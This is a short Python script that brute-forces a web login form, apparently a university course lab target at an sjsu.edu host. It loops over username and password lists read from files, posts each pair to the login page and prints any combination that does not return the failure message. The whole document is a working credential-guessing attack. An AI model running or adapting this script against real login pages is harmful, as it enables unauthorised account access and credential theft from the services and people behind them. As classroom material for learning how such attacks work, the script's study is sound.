#!/usr/bin/python3

import requests

url = 'http://cs31.cs.sjsu.edu/basic_login/logincheck.php'
userfile = 'users'
passfile = 'passwords'

# Read users and passwords

with open(userfile) as f:
    users = f.read()

users = users.split('\n')[:-1]

with open(passfile) as f:
    passwords = f.read()

passwords = passwords.split('\n')[:-1]

# GO!!!!

for user in users:
    for pw in passwords:
        # user = 'batman'
        print('requesting {}, {}'.format(user, pw))

        auth = {'loginUsername': user,
                'loginPassword': pw}
        r = requests.post(url, data=auth)
        if 'Incorrect username or password' not in r.text:
            print('FOUND user: \'{}\', pass: \'{}\''.format(user, pw))
            print(r.text)
